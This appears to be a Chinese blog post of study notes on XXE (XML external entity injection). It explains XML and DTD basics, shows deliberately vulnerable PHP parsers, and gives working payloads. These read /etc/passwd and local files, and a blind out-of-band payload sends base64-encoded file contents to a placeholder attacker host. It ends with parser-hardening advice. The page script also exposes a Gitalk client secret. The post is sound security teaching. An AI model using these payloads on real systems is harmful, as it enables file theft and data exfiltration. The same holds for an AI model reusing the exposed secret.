@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>XXE学习笔记 | Today is new</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://0xwi11.github.io/favicon.ico?v=1706710799621">
+<link rel="stylesheet" href="https://0xwi11.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="XXE是什么
+XXE(XML External Entity Injection) 全称为 XML 外部实体注入，这是一个注入漏洞。注入的是什么？XML外部实体。因此其利用点是 外部实体 ，如果能注入 外部实体并且成功解析的话，这就会大大拓..." />
+    <meta name="keywords" content="信息安全" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://0xwi11.github.io">
+        <img src="https://0xwi11.github.io/images/avatar.png?v=1706710799621" class="site-logo">
+        <h1 class="site-title">Today is new</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+          <a class="social-link" href="https://github.com/0xWi11?tab=overview&amp;from=2023-02-01&amp;to=2023-02-28" target="_blank">
+            <i class="fab fa-github"></i>
+          </a>
+        
+      
+        
+          <a class="social-link" href="https://twitter.com/0xwi11" target="_blank">
+            <i class="fab fa-twitter"></i>
+          </a>
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      相信美好的事情将会发生
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://0xwi11.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">XXE学习笔记</h2>
+            <div class="post-date">2019-02-25</div>
+            
+            <div class="post-content" v-pre>
+              <h2 id="xxe是什么">XXE是什么</h2>
+<p>XXE(XML External Entity Injection) 全称为 XML 外部实体注入，这是一个注入漏洞。注入的是什么？XML外部实体。因此其利用点是 外部实体 ，如果能注入 外部实体并且成功解析的话，这就会大大拓宽我们 XML 注入的攻击面。（相反，单纯的XML注入比较鸡肋。）</p>
+<p>在解析外部实体的过程中，XML解析器可以根据URL中指定的方案（协议）来查询各种网络协议和服务（DNS，FTP，HTTP，SMB等）。 外部实体对于在文档中创建动态引用非常有用，这样对引用资源所做的任何更改都会在文档中自动更新。 但是，在处理外部实体时，可以针对应用程序启动许多攻击。 这些攻击包括泄露本地系统文件，这些文件可能包含密码和私人用户数据等敏感数据，或利用各种方案的网络访问功能来操纵内部应用程序。 通过将这些攻击与其他实现缺陷相结合，这些攻击的范围可以扩展到客户端内存损坏，任意代码执行，甚至服务中断，具体取决于这些攻击的上下文。</p>
+<h2 id="什么是-xml">什么是 XML?</h2>
+<p>以下内容主要参考W3School的XML系列教程</p>
+<p>要了解XXE，首先要了解XML标记语言。XML标记语言有哪些特征呢？</p>
+<ul>
+<li>XML 指可扩展标记语言（EXtensible Markup Language）</li>
+<li>XML 是一种标记语言，很类似 HTML</li>
+<li>XML 的设计宗旨是传输数据，而非显示数据</li>
+<li>XML 标签没有被预定义。您需要自行定义标签。</li>
+<li>XML 被设计为具有自我描述性。<br>
+XML 被设计为传输和存储数据，其焦点是数据的内容。HTML 被设计用来显示数据，其焦点是数据的外观。XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。XML文档用途广泛，最常见的比如订阅一个网站时的rss.xml等。XML本质上就是一段自我描述的数据。XML是一种树结构。语法参考链接http://www.w3school.com.cn/xml/xml_syntax.asp</li>
+</ul>
+<p>重点语法规则主要有这样几点：</p>
+<ul>
+<li>所有 XML 元素都须有关闭标签</li>
+<li>XML 标签对大小写敏感</li>
+<li>XML 必须正确地嵌套</li>
+<li>XML 文档必须有根元素</li>
+<li>XML 的属性值须加引号</li>
+<li>如果你把字符 “&lt;” 放在 XML 元素中，会发生错误，一些特殊字符需要转义。</li>
+</ul>
+<p>此外，好的XML文档不仅遵循XML的规范，还符合DTD(document type definition)规范。</p>
+<h2 id="什么是dtd">什么是DTD？</h2>
+<p>所谓的DTD，Document Type Definition，文件类型定义，用来宣告网页的文件类型。举例来说，HTML 有很多版本，如：HTML, HTML2.0, … , XHTML, XHTML5 等，利用&lt;!DOCTYPE&gt; 让浏览器能正确显示内容。</p>
+<p>通过 DTD，您的每一个 XML 文件均可携带一个有关其自身格式的描述。可一致地使用某个标准的 DTD 来交换数据。应用程序也可使用某个标准的 DTD 来验证从外部接收到的数据。还可以使用 DTD 来验证您自身的数据。</p>
+<p>它使用一系列合法的元素来定义文档结构：</p>
+<pre><code class="language-xml">&lt;!DOCTYPE note [
+  &lt;!ELEMENT note (to,from,heading,body)&gt;
+  &lt;!ELEMENT to      (#PCDATA)&gt;
+  &lt;!ELEMENT from    (#PCDATA)&gt;
+  &lt;!ELEMENT heading (#PCDATA)&gt;
+  &lt;!ELEMENT body    (#PCDATA)&gt;
+]&gt; 
+</code></pre>
+<p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p>
+<p><strong>内部的 DOCTYPE 声明</strong></p>
+<p>假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中：</p>
+<pre><code class="language-xml">&lt;!DOCTYPE 根元素 [元素声明]&gt;
+</code></pre>
+<p>带有 DTD 的 XML 文档实例：</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE note [			这是DTD内部声明		
+  &lt;!ELEMENT note (to,from,heading,body)&gt;
+  &lt;!ELEMENT to      (#PCDATA)&gt;
+  &lt;!ELEMENT from    (#PCDATA)&gt;
+  &lt;!ELEMENT heading (#PCDATA)&gt;
+  &lt;!ELEMENT body    (#PCDATA)&gt;
+]&gt;							
+&lt;note&gt;
+  &lt;to&gt;George&lt;/to&gt;
+  &lt;from&gt;John&lt;/from&gt;
+  &lt;heading&gt;Reminder&lt;/heading&gt;
+  &lt;body&gt;Don't forget the meeting!&lt;/body&gt;
+&lt;/note&gt;
+</code></pre>
+<p>以上 DTD 解释如下：</p>
+<ul>
+<li>!DOCTYPE note (第二行)定义此文档是 note 类型的文档。</li>
+<li>!ELEMENT note (第三行)定义 note 元素有四个元素：”to、from、heading,、body”</li>
+<li>!ELEMENT to (第四行)定义 to 元素为 “#PCDATA” 类型<br>
+(之后类似)<br>
+<strong>这里有一个小重点Tips：</strong></li>
+<li>“#PCDATA” 类型为被解析的字符数据（parsed character data）。表示读文件按照XML格式进行解析</li>
+<li>“#CDATA”类型为字符数据（character data）。表示读文件但是不用解析，直接读文件的原始内容<br>
+<strong>外部文档声明</strong><br>
+假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：</li>
+</ul>
+<pre><code class="language-xml">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;
+</code></pre>
+<p>这个 XML 文档和上面的 XML 文档相同，但是拥有一个外部的 DTD:</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;		# dtd文件的绝对路径
+&lt;note&gt;
+&lt;to&gt;George&lt;/to&gt;
+&lt;from&gt;John&lt;/from&gt;
+&lt;heading&gt;Reminder&lt;/heading&gt;
+&lt;body&gt;Don't forget the meeting!&lt;/body&gt;
+&lt;/note&gt; 
+</code></pre>
+<p>这是包含 DTD 的 “note.dtd” 文件：</p>
+<pre><code class="language-xml">&lt;!ELEMENT note (to,from,heading,body)&gt;
+&lt;!ELEMENT to (#PCDATA)&gt;
+&lt;!ELEMENT from (#PCDATA)&gt;
+&lt;!ELEMENT heading (#PCDATA)&gt;
+&lt;!ELEMENT body (#PCDATA)&gt;
+</code></pre>
+<p>其他更多的可能需要读者参考这个链接进行学习http://www.w3school.com.cn/dtd/index.asp。<br>
+<strong>一个内部实体声明</strong><br>
+语法：</p>
+<pre><code class="language-xml">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;
+</code></pre>
+<p>例子：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;
+&lt;creds&gt;
+&lt;user&gt;&amp;xxe;&lt;/user&gt;
+&lt;pass&gt;mypass&lt;/pass&gt;
+&lt;/creds&gt;
+</code></pre>
+<p>我们使用 &amp;xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 &amp;xxe 就会被 “test” 替换。</p>
+<p><strong>一个外部实体声明</strong></p>
+<p>语法：</p>
+<pre><code class="language-xml">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;
+</code></pre>
+<p>例子：</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;]&gt;
+&lt;creds&gt;
+    &lt;user&gt;&amp;xxe;&lt;/user&gt;
+    &lt;pass&gt;mypass&lt;/pass&gt;
+&lt;/creds&gt;
+</code></pre>
+<h2 id="xxe-的成因">XXE 的成因</h2>
+<p>上面介绍了这么多，大概才把XXE的基础知识介绍完，接下来，我们具体看一下这个外部实体注入漏洞的成因和攻击面。<br>
+<strong>会发生XXE 主要是因为<code>parser</code> 没有禁止使用外部实体</strong>，如常见的php函数<code>simplexml_load_string()</code>会解析外部实体。我们可以自行定义一个实体名称，并在实体内容中定义要服务器做的行为，从而造成攻击，因此注入点通常是可以输入XML 的位置。</p>
+<h1 id="xxe的攻击面">XXE的攻击面</h1>
+<p>那么，我们究竟可以利用XXE做哪些事情呢？下面介绍一下XXE的攻击面。</p>
+<ol>
+<li>有回显的任意文件读取<br>
+攻击场景模拟的是在服务能接收并解析 XML 格式的输入并且有回显的时候，我们可以控制输入的XML代码造成服务器上任意文件的读取。<br>
+<strong>xml.php</strong></li>
+</ol>
+<pre><code class="language-php">&lt;?php
+
+    libxml_disable_entity_loader (false);
+    $xmlfile = file_get_contents('php://input');
+    $dom = new DOMDocument();
+    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
+    $creds = simplexml_import_dom($dom);
+    echo $creds;
+
+?&gt;
+</code></pre>
+<p><strong>payload</strong></p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
+&lt;!DOCTYPE creds [  
+&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt; 
+&lt;creds&gt;&amp;xxe;&lt;/creds&gt;
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://0xwi11.github.io/post-images/1678594267772.jpg" alt="" loading="lazy"></figure>
+<p>但是直接读文件，在遇到文件内容中含有&lt;,&amp;等未转义的字符时，解析会报错。这是由于XML的外部实体特性导致的，如以下文件：</p>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;HTML5 rose&lt;/title&gt;
+&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://0xwi11.github.io/post-images/1678594301890.png" alt="" loading="lazy"></figure>
+<p><strong>解决方案</strong></p>
+<p>前面提到CDATA是将文件当做原始字符串而不进行解析，于是，可以通过 <![CDATA[和 ]]>将payload包裹起来，使其不解析为XML就可以读取此类文件了。由于普通实体不能直接拼接，需要先拼接再调用，于是需要利用参数实体。</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
+&lt;!DOCTYPE roottag [
+&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   
+&lt;!ENTITY % xxe SYSTEM &quot;file:///e:/test.txt&quot;&gt;  
+&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  
+&lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; 
+%dtd; ]&gt; 
+
+&lt;roottag&gt;&amp;all;&lt;/roottag&gt;
+</code></pre>
+<p>evil.dtd</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; 
+&lt;!ENTITY all &quot;%start;%xxe;%end;&quot;&gt;
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://0xwi11.github.io/post-images/1678594345185.png" alt="" loading="lazy"></figure>
+<p>于是通过XXE和CDATA就基本上实现了任意文件读取。</p>
+<ol start="2">
+<li>无回显任意文件读取（Blind OOB XXE）<br>
+通常情况下，xml文件是用于服务器的各项配置的，而不是直接输出的，于是我们需要寻找其他不依托服务器回显的方法来实现任意文件读取。</li>
+</ol>
+<p><strong>xml.php</strong></p>
+<pre><code class="language-php">&lt;?php
+//相比上一段代码，缺少了回显过程，只有解析过程。
+libxml_disable_entity_loader (false);
+$xmlfile = file_get_contents('php://input');
+$dom = new DOMDocument();
+$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
+?&gt;
+</code></pre>
+<p>那么，利用什么方法来进行无回显的读取呢？</p>
+<p>通过之前的学习，我们知道参数实体是可以合并依次调用的。那么我们可以利用三个参数实体，先去访问VPS的一个evil.dtd，调用evil.dtd的参数去读取服务器的敏感文件，放到一个参数中，再利用最后一个参数实体将文件内容发到VPS的一个端口。</p>
+<p>利用这个思路，我们可以构造这样的payload：</p>
+<p><strong>test.dtd</strong></p>
+<pre><code class="language-xml">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///e:/test.txt&quot;&gt;
+&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM 'http://ip:2333?p=%file;'&gt;&quot;&gt;
+</code></pre>
+<p><strong>payload：</strong></p>
+<!DOCTYPE convert [ 
+<!ENTITY % remote SYSTEM "http://ip/test.dtd">
+<p>%remote;%int;%send;<br>
+]&gt;<br>
+<img src="https://0xwi11.github.io/post-images/1678594418718.png" alt="" loading="lazy"><br>
+<img src="https://0xwi11.github.io/post-images/1678594451776.jpg" alt="" loading="lazy"><br>
+需要注意的是dtd文件中作为内容的一段实体数据需要转义<code>&quot;&lt;!ENTITY &amp;#x25; send SYSTEM 'http://ip:2333?p=%file;'&gt;&quot;</code></p>
+<p>发现虽然无回显，但是依然可以通过这样的方法读取数据。</p>
+<h2 id="xxe的防护">XXE的防护</h2>
+<p>在介绍成因的时候说过，会发生XXE 主要是因为parser 没有禁止使用外部实体，所以防护方法就是使用语言中推荐的禁用外部实体的方法。</p>
+<p>PHP：<br>
+<code>libxml_disable_entity_loader(true);</code></p>
+<p>Java:</p>
+<pre><code class="language-java">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
+dbf.setExpandEntityReferences(false);
+
+.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;,true);
+
+.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;,false)
+
+.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;,false);
+</code></pre>
+<p>Python:</p>
+<pre><code class="language-python">from lxml import etree
+xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
+</code></pre>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://0xwi11.github.io/tag/amUzoEOq9/" class="tag">
+                    信息安全
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://0xwi11.github.io/post/php-dong-tai-bian-liang/">
+                  <h3 class="post-title">
+                    php动态变量
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: 'b2be97bd4f11fa2c7ed0',
+        clientSecret: '7cd82370c455720ef14b1c828ee50582651f71c4',
+        repo: 'bolg-comment',
+        owner: '0xWi11',
+        admin: ['0xWi11'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
